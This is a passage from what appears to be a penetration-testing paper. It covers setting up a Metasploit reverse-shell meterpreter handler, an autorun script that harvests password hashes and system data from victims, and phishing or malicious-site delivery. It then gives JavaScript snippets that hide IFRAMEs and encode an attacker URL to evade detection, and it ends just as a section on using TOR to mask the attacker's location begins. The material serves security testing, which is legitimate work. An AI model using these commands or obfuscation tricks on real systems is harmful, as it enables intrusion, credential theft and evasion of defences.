height="1">
 use exploit/multi/handler
–
msf exploit(handler) > set ExitOnSession false
Page 12 of 26
 Victim receives message 
box
 Digital Signature will 
appear to have the 
“trusted” information
 Many users will run this
 Basically Social 
Engineering / Targeted 
Phishing
–
msf exploit(handler) > set PAYLOAD 
windows/meterpreter/reverse_tcp
•
msf exploit(handler) > set LHOST 192.168.0.34
•
msf exploit(handler) > set LPORT 8000
Then setup an automation script and set MSF in multihandling mode so it doesn’t exit 
when quitting a session:
–
msf exploit(handler) > set AutoRunScript ./PhishScrape.rb
–
msf exploit(handler) > exploit –j
An attacker can use any script for post­exploitation automation, there is an example 
provided in the appendix.
Once the stand alone metrepreter binary is created the attacker can it to the target using 
whatever means including infected PDF files, malicious websites, client side exploits, a 
malicious java applet like the example given earlier. A document or the meterpreter itself 
can me mailed as an attachment directly to targets, or placed on a website for download 
by victims for example.
The attacker then watches for:
[*] Transmitting intermediate stager for over­sized stage...(191 bytes)
This indicates successful compromise of a target.. Many target sessions may come in at 
once depending how the exploit is deployed.
To list available sessions sessions do:
•
sessions –l
•
Then standard meterpreter commands can be used
After a metrepreter is deployed a post exploitation automation script is run on each target. 
Depending on how much and how complex the script is this may take some time. The 
example script will gather information from the target automatically and place it in 
~/.msf3/logs/scraper and each target will generate a sub directory named 
ipaddress_data_timestamp.
The following information will be autoscraped:
–
env.txt
# System environment
–
group.txt
# Domain group info
–
hashes.txt
# Crackable password hashes
–
localgroup.txt
# local group memberships
–
nethood.txt
# network neighborhood info
Page 13 of 26
–
network.txt
# detail networking info of target
–
services.txt
# running services (look for AV)
–
shares.txt
# Any shared directories
–
system.txt
# operating system info
–
users.txt
# local user account names
A resource for other automation scripts is DarkOperator’s script archive at 
http://www.darkoperator.com/ .
Chapter 6
Obfuscation
6.1 Simple Code Obfuscation Methods
The tester may want to consider employing code obfuscation in order to attempt to evade 
any network or host intrusion detection systems. This paper will not provide a 
comprehensive discussion of all known methods but will present a few of the simpler 
ones to assist the tester.
IFRAME Obfuscation
Many attacks utilize HTML IFRAMES to deploy exploits while also displaying expected 
content to the user. Ex.:
Some systems may detect and block or otherwise prevent these IFRAMEs. Attackers in 
the while are employing simple methods such as breaking up the IFRAME and using 
javascript to reassemble it in order to bypass simple parsers that look for the string 
“IFRAME”. Ex.:
var x = "rame"; 
var y = "i" + "f"; 
var el = document.createElement(y + x); 
el.setAttribute("width", 1); 
el.setAttribute("height", 1); 
el.setAttribute("s" + "rc", p); 
el.setAttribute("marg" + "inwidth", 0); 
el.setAttribute("marg" + "inheight", 0); 
el.setAttribute("scr" + "olling", "no"); 
el.setAttribute("f" + "rameborder", "0"); 
Character Encoding
Page 14 of 26
Another method used by attackers to obfuscate their code which may be employed by 
testers is the idea od character encoding. Essentially the attacker converts their URLs, 
commands, or anything they want hidden from someone who might view the source of 
the page, or automated tools that parse for potentially malicious strings to the numerical 
values for each character. Then the attacker writes a small function that converts those 
values back to strings for the browser. Ex.:
var p = (String.fromCharCode.apply(window, [104, 116, 116, 112, 58, 47, 
47,101,118,105,108,46,99,111,109,]) 
Escape Codes
Escape codes are another encoding method used by attackers to obfuscate their code an 
evade potential detection. This process converts string characters to “%” symbol escaped 
two­character 8­bit hexadecimal values. Ex.:
Which decodes to : 
A similar technique is to use a more customized encoding routine or Unicode. More 
indepth examples can be found here: http://scriptasylum.com/tutorials/encdec/encode­
decode.html. Many variations to this theme can be made, however in general any simple 
encoding is enough to confound most automated processes or unknowledgeable users.
Chapter 7 
TOR
7.1 Using TOR as a Weapon
Most people who use TOR commonly use it to browse the web anonymously and believe 
this is the main purpose for the tool. The TOR developers however designed the software 
to be able to handle any type of traffic that uses TCP. This section of the paper combines 
the documented features of TOR, information from all over the Internet, weeks of testing 
and tweaking, and custom code and puts them all together to show how TOR can be a 
valuable part of the pen tester’s toolkit.
Page 15 of 26
There are many reasons why it is important for a pen tester or a person who is working 
with defense to understand TOR. Clients may block all traffic coming from the pen 
tester’s IP, often to make their network appear more than it is. One solution available for 
the pen tester is to get a hotel room, or go to a coffee shop and utilize publicly available 
wifi in order to mask their source IP, but TOR is a possible alternative. It allows the pen 
tester to appear as if their IP is coming out of a different city, or even country. This also 
allows the pen tester to view different webpages that are set up only to display to 
particular areas, and check the traffic filtering rules. From a defensive view point, it is 
important to understand that this is possible, and something to check before assuming a 
block will prevent someone from attacking your institution, or that you can be certain 
where attacks are coming from. 
7.2 Controlling the Exit Location